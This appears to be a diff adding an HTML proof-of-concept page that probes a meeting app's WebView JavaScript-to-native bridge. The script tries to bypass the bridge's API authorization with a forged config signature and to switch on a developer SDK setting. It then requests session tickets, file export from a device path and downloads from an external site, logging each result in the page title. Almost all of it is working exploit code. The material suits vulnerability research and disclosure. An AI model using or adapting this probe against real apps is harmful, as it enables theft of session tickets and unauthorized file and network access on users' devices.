@@ -1,0 +1,40 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P3</h1><pre id="log"></pre>
+<script>
+document.title='WM-POC-P3';
+function note(t){ document.title=String(t); }
+function call(mod, method, param){
+  if(!window.JSCallJavaMgr){ note('NOJSB '+mod+'.'+method); return; }
+  window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+    callback:'window.__wmpoc', module:mod, method:method, param:param||{},
+    callId:'p3-'+mod+'-'+method
+  }));
+}
+window.__wmpoc=function(res){
+  try{ note('CB '+JSON.stringify(res)); }
+  catch(e){ note('CB '+String(res)); }
+};
+var steps=[
+  function(){ note('JSB='+!!window.JSCallJavaMgr); },
+  function(){ call('OpenApiPlugin','CheckJsApiConfig',{}); },
+  function(){ call('DevtoolWebviewPlugin','GetOpenSDKSwitchState',{}); },
+  function(){ call('DevtoolWebviewPlugin','UpdateOpenSDKSwitchState',{state:1}); },
+  function(){ call('OpenApiPlugin','JsApiConfig',{corpId:'1',sdkId:'1',timestamp:'1',nonceStr:'1',signature:'1'}); },
+  function(){ call('OpenApiPlugin','CheckJsApiConfig',{}); },
+  function(){ call('CommonPlugin','GetTicket',{}); },
+  function(){ call('CommonPlugin','GetCurrentPageTicket',{}); },
+  function(){ call('CommonPlugin','LoadUrl',{url:'https://httpbin.org/uuid'}); },
+  function(){ call('CommonPlugin','ExportFile',{path:'/data/local/tmp/x',fileName:'x'}); },
+  function(){ call('MeetlogWebPlugin','DownloadFile',{url:'https://httpbin.org/bytes/32',fileName:'poc.bin',md5:''}); }
+];
+var i=0;
+function next(){
+  if(i>=steps.length){ note('P3-DONE'); return; }
+  try{ steps[i](); }catch(e){ note('EX '+e); }
+  i++;
+  setTimeout(next, 700);
+}
+setTimeout(next, 500);
+</script>
+</body></html>
